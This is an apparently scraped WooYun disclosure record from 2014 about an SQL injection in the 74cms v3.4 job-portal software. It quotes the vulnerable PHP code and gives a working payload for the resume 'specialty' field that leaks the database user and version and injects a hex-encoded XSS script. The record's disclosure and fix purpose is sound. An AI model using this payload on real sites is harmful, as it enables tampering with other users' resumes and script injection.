{"id": 1200, "wybug_id": "wooyun-2014-071571", "wybug_title": "骑士人才系统注入(20140805)注入一枚", "wybug_corp": "74c,s.com", "wybug_author": "loopx9", "wybug_date": "2014-08-09 15:22", "wybug_open_date": "2014-09-23 15:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向公众公开  简要描述： v3.4 20140808 详细说明：  include/common.fun.php\nfunction updatetable($tablename, $setsqlarr, $wheresqlarr, $silent=0) {\tglobal $db;\t$setsql = $comma = '';\tforeach ($setsqlarr as $set_key => $set_value) {\t\tif(is_array($set_value)) {  //如果是数组就取第一个元素\t\t\t$setsql .= $comma.'`'.$set_key.'`'.'='.$set_value[0];   //没引号\t\t} else {\t\t\t$setsql .= $comma.'`'.$set_key.'`'.'=\\''.$set_value.'\\'';  //有引号\t\t}\t\t$comma = ', ';\t}\t$where = $comma = '';\tif(empty($wheresqlarr)) {\t\t$where = '1';\t} elseif(is_array($wheresqlarr)) {\t\tforeach ($wheresqlarr as $key => $value) {\t\t\t$where .= $comma.'`'.$key.'`'.'=\\''.$value.'\\'';\t\t\t$comma = ' AND ';\t\t}\t} else {\t\t$where = $wheresqlarr;\t}\treturn $db->query(\"UPDATE \".($tablename).\" SET \".$setsql.\" WHERE \".$where, $silent?\"SILENT\":\"\");}\nuser/personal/personal_resume.php  284行:\nelseif ($act=='make3_save'){\t\tif (intval($_POST['pid'])==0 ) showmsg('参数错误！',1);\t$setsqlarrspecialty['specialty']=!empty($_POST['specialty'])?$_POST['specialty']:showmsg('请填写您的技能特长！',1);  //specialty可作数组传入\t$_CFG['audit_edit_resume']!=\"-1\"?$setsqlarrspecialty['audit']=intval($_CFG['audit_edit_resume']):\"\";\tupdatetable(table('resume'),$setsqlarrspecialty,\" id='\".intval($_POST['pid']).\"' AND uid='\".intval($_SESSION['uid']).\"'\");  //进入查询\tupdatetable(table('resume_tmp'),$setsqlarrspecialty,\" id='\".intval($_POST['pid']).\"' AND uid='\".intval($_SESSION['uid']).\"'\");\tcheck_resume($_SESSION['uid'],intval($_REQUEST['pid']));\tif ($_POST['go_resume_show'])\t{\t\theader(\"Location: ?act=resume_show&pid={$_POST['pid']}\");\t}\telse\t{\t\theader(\"Location: ?act=make4&pid=\".intval($_POST['pid']));\t}}\n   漏洞证明：  这个注入可以越权更改任意简历，或是插入xss。在个人简历技能特长处填入:\nconcat(user(),0x0a,version(),0x0a,0x3C7363726970743E616C657274282F7873732F293C2F7363726970743E)\n过滤函数绕不过，只能找找二次注入\n\n\n\n   修复方案：  加引号&过滤.   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-08-09 17:41 厂商回复： 感谢您提交的漏了和修复方案！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-01 13:55 |    \t\t拨开乌云 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        )\t\t \n  不错啊，原来还能这样。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}